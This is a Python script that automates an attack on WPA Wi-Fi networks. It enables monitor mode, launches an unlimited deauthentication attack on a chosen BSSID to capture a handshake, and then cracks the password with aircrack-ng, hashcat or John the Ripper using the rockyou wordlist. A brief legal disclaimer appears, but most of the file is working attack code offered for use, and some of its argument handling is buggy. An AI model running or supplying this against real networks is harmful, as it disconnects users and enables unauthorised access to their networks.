#!/usr/bin/env python3
import subprocess
import os
import time
import sys

uid = os.getuid()

def check_handshake(pcap_file):
    # Use tshark to check for WPA handshakes in the pcap file
    result = subprocess.run(['tshark', '-r', pcap_file, '-Y', 'eapol'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return 'EAPOL' in result.stdout.decode()

def crack_with_aircrack(pcap_file, bssid, wordlist):
    subprocess.run(['aircrack-ng', '-w', wordlist, '-b', bssid, pcap_file])

def convert_to_hashcat_format(pcap_file, outfile):
    subprocess.run(['hcxpcapngtool', '-o', outfile, pcap_file])

def crack_with_hashcat(hash_file, wordlist):
    subprocess.run(['hashcat', '-m' , '22000' '-a', '0', hash_file, wordlist])

def crack_with_john(pcap_file, wordlist):
    subprocess.run(['john', '--wordlist=' + wordlist, pcap_file])

def install_package(package):
    """Install a package using apt-get (for Debian-based systems). Modify as needed."""
    try:
        subprocess.run(['apt-get', 'install', package], check=True)
    except subprocess.CalledProcessError as e:
        print(f'Error installing {package}: {e}')
        sys.exit(1)

def check_program_installed(program):
    """Check if a program is installed on the system. Install if missing."""
    try:
        subprocess.run(['which', program], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        print(f'{program} is not installed. Installing...')
        if program == 'hcxpcapngtool':
            install_package('hcxtools')  # Install hcxtools package which includes hcxpcapngtool
        elif program in ['tshark', 'aircrack-ng', 'hashcat', 'john']:
            install_package(program)
        else:
            print(f'Error: {program} installation not supported.')
            sys.exit(1)
        return False

def print_menu():
    print("""

    [1] Crack with aircrack-ng
    [2] Crack with hashcat
    [3] Crack with john the ripper
    [4] Skip cracking
    [5] Exit
    """)

def main():
    # Check required programs
    required_programs = ['tshark', 'aircrack-ng', 'hcxpcapngtool', 'hashcat', 'john']
    for prog in required_programs:
        if not check_program_installed(prog):
            print(f'Error: {prog} is not installed. Please install it and try again.')
            sys.exit(1)

    if uid != 0:
        print('You must be \033[91m\033[1mroot\033[0m to run this script.')
        sys.exit(1)

    subprocess.run(['clear'])
    # Clear the terminal from any mess
    print("Caution! This script holds mighty power, especially since hacking without consent is illegal.\nBy using this script, you agree that you are using it for Legal/ethical/Educational purposes and with consent from the person you're attacking.")
    maybe = input('Running this script requires you to shut down some network services. You will not be able to connect to the internet.\n\nProceed? (y/n) ')

    if maybe.lower() != 'y':
        print('mkay, exiting')
        sys.exit(0)

    print('\nKilling all conflicting processes...')
    subprocess.run(['airmon-ng', 'check', 'kill'])
    subprocess.run(['iwconfig'])

    interface = input('\nWhich interface do you want airmon-ng to run on? ')
    print('\nStarting up Airmon-ng...')
    subprocess.run(['airmon-ng', 'start', interface])

    print('Starting airodump-ng, press Ctrl+C when ready to stop...')
    time.sleep(2)

    try:
        subprocess.run(['airodump-ng', interface])
    except KeyboardInterrupt:
        pass

    bssid = input('\nWhich BSSID would you like to attack? ')
    channel = input('\nWhich channel is it running on? ')
    outfile = input('What do you want to call the output file? ')

    print('Running a deauth attack on', bssid, 'channel', channel, '...')
    time.sleep(2)
    # airodump-ng -c 8 --bssid [yes] wlan0
    pcap_file = outfile + '-01.cap'
    airodump_process = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', outfile, interface])
    subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, interface])

    print('\nPress Ctrl+C when ready to stop airodump-ng and check for handshake...')
    try:
        airodump_process.wait()
    except KeyboardInterrupt:
        airodump_process.terminate()

    print('\nChecking for handshake...')
    time.sleep(5)  # Give some time for the deauth attack to capture the handshake

    if check_handshake(pcap_file):
        print('Handshake detected! Do you want to crack the password? (y/n)')
        crack = input()
        if crack.lower() == 'y':
            wordlist = input('Enter the path to your wordlist (leave empty to use rockyou.txt): ')
            if not wordlist:
                wordlist = '/usr/share/wordlists/rockyou.txt'
            
            print_menu()
            choice = input('Choice: ')

            if choice == '1':
                crack_with_aircrack(pcap_file, bssid, wordlist)
            elif choice == '2':
                hash_file = outfile + '.hc22000'
                convert_to_hashcat_format(pcap_file, hash_file)
                crack_with_hashcat(hash_file, wordlist)
            elif choice == '3':
                crack_with_john(pcap_file, wordlist)
            elif choice == '4':
                print('Skipping password cracking.')
            elif choice == '5':
                print('Exiting...')
                sys.exit(0)
            else:
                print('Invalid choice, skipping password cracking.')
        else:
            print('Skipping password cracking.')
    else:
        print('No handshake detected.')

if __name__ == '__main__':
    main()

# Tasneem will you marry me? 
